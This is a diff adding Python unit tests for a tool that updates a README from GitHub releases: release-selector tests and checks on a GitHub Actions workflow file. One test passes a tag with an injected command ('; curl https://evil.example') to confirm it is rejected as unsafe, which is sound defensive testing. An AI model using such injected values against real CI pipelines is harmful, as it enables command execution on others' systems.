@@ -287,5 +287,47 @@ class CliTests(unittest.TestCase):
         self.assertEqual(self.readme.read_text(encoding="utf-8"), before)
 
 
+class ReleaseSelectorTests(unittest.TestCase):
+    def test_release_event_uses_numeric_id(self) -> None:
+        selector = mod.resolve_release_selector("release", release_id="514537781")
+        self.assertEqual(selector, {"mode": "id", "value": "514537781"})
+
+    def test_repository_dispatch_uses_safe_tag(self) -> None:
+        selector = mod.resolve_release_selector(
+            "repository_dispatch",
+            dispatch_tag="v0.0.4",
+        )
+        self.assertEqual(selector, {"mode": "tag", "value": "v0.0.4"})
+
+    def test_repository_dispatch_rejects_malicious_tag(self) -> None:
+        with self.assertRaises(mod.ReadmeReleaseError) as ctx:
+            mod.resolve_release_selector(
+                "repository_dispatch",
+                dispatch_tag="v0.0.4\n; curl https://evil.example",
+            )
+        self.assertEqual(ctx.exception.code, "unsafe_tag")
+
+    def test_workflow_dispatch_without_tag_uses_latest_stable(self) -> None:
+        selector = mod.resolve_release_selector("workflow_dispatch")
+        self.assertEqual(selector, {"mode": "latest_stable", "value": ""})
+
+    def test_unsupported_event_fails(self) -> None:
+        with self.assertRaises(mod.ReadmeReleaseError) as ctx:
+            mod.resolve_release_selector("push")
+        self.assertEqual(ctx.exception.code, "unsupported_event")
+
+
+class WorkflowContractTests(unittest.TestCase):
+    def test_workflow_checks_out_main_and_accepts_canonical_dispatch(self) -> None:
+        text = (ROOT / ".github/workflows/update-readme-release.yml").read_text(encoding="utf-8")
+        self.assertIn("ref: main", text)
+        self.assertIn("repository_dispatch:", text)
+        self.assertIn("stable-release-published", text)
+        self.assertIn("types: [published]", text)
+        self.assertIn("contents: write", text)
+        self.assertNotIn("pull_request:", text)
+        self.assertIn('git push origin HEAD:main', text)
+
+
 if __name__ == "__main__":
     unittest.main()
